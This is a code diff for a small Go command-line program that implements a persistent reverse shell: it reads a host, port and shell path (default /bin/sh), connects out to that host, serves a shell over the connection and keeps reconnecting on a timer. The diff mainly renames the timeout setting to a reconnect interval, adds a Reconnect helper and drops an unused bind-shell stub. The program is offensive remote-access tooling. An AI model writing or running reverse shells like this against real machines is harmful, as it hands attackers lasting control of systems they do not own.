@@ -3,29 +3,28 @@ package main
 import (
 	"net"
 	"time"
-    "flag"	
-	"log"
+    "flag"
 )
 
 type Config struct {
 	Address 	string
 	Shell		string
 	OS			string
-	Timeout 	time.Duration
+	Reconnect 	time.Duration
 }
 
 func main() {
 	var config Config
-	var host, port, timeout string
+	var host, port, reconnect string
 
     flag.StringVar(&host, "host", "127.0.0.1", "Host")
 	flag.StringVar(&port, "port", "1234", "Port")
-	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Port")
-	flag.StringVar(&timeout, "timeout", "15s", "Reconnecting Time")
+	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Unix Shell")
+	flag.StringVar(&reconnect, "recon", "15s", "Reconnecting Time")
     flag.Parse()
 
 	config.Address = host + ":" + port
-	config.Timeout, _ = time.ParseDuration(timeout)
+	config.Reconnect, _ = time.ParseDuration(reconnect)
 
 	ReverseShell(config)
 }
@@ -37,14 +36,14 @@ func ReverseShell(config Config) {
 			conn.Close()
 		}
 
-		// reconnect
-		time.Sleep(config.Timeout)
-		ReverseShell(config)
+		Reconnect(config)
 	}
 
-	Shell(conn, config)    
+	Shell(conn, config)
+	Reconnect(config)
 }
 
-func BindShell(config Config) {
-	log.Println(config.Address)
+func Reconnect(config Config) {
+	time.Sleep(config.Reconnect)
+	ReverseShell(config)
 }
